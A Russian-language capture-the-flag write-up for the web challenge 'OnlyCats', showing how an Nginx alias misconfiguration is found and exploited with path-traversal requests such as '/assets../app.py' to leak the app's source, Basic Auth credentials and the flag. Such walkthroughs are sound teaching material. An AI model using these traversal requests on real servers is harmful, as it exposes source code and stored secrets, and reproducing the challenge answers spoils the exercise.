# OnlyCats

## Описание:


| Название | Сложность | Автор |
|------|------------|--------|
| OnlyCats | Easy |[@collapsz](https://github.com/collapsz17) |

## TLDR

Утечка данных авторизации через **Nginx alias traversal**

---
## Решение:

На веб интерфейсе не самое богатое на функционал приложение:

<img width="1795" alt="image" src="https://github.com/user-attachments/assets/ad0a5463-6213-4359-95eb-f75a79708105" />

`dirsearch` покажет имеющиеся директории:

<img width="1075" alt="image" src="https://github.com/user-attachments/assets/67696f77-d4cd-4302-b522-91859747552d" />

`whatweb` – стек используемых технологий: 

<img width="995" alt="image" src="https://github.com/user-attachments/assets/ac57b58e-812d-4ee3-98bd-d1e99802255b" />

Примечательно, что приложение развернуто на `nginx`. Немного погуглив, можно выйти на данный [материал](https://habr.com/ru/articles/745718/)

И в самом деле запрос вида 
```
curl http://192.168.0.102:81/assets/cat.jpg | head -n 10
```

Выведет нам то же самое, что и

```
curl http://192.168.0.102:81/assetscat.jpg | head -n 10
```

<img width="1133" alt="image" src="https://github.com/user-attachments/assets/f775c7f6-f275-4c69-aaf3-899a822d8fec" />

Таким образом находим на сервере мискофигурацию в nginx alias. Посмотрим что там еще найдется:

```
dirsearch http://192.168.0.102:81/assets../
```

<img width="1005" alt="image" src="https://github.com/user-attachments/assets/fdd51ec1-f423-4d78-9d17-e68b89f75eb9" />

app.py содержит в себе весь исходный код приложения, включая креды для Basic Auth:
```
curl 192.168.0.102:81/assets../app.py                                                                                                                               ─╯
from flask import Flask, request, jsonify, render_template
from flask_basicauth import BasicAuth

from os import getenv

app = Flask(__name__)

app.config['BASIC_AUTH_USERNAME'] = 'cat' 
app.config['BASIC_AUTH_PASSWORD'] = 'icr34t3d0nlyc4tsjustt0sh4res0m3c4tp1ctur3s'  
basic_auth = BasicAuth(app)


@app.route('/')
def hello():
    return render_template('index.html')


@app.route('/admin', methods=['GET', 'POST'])
@basic_auth.required
def admin():
    flag = getenv('FLAG')  
    return render_template('admin.html', flag = flag)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

Авторизуемся на /admin c этими кредами, забираем флаг
## Flag:
rdg{af4cf13151aee7af4aa26b9bb817a079}
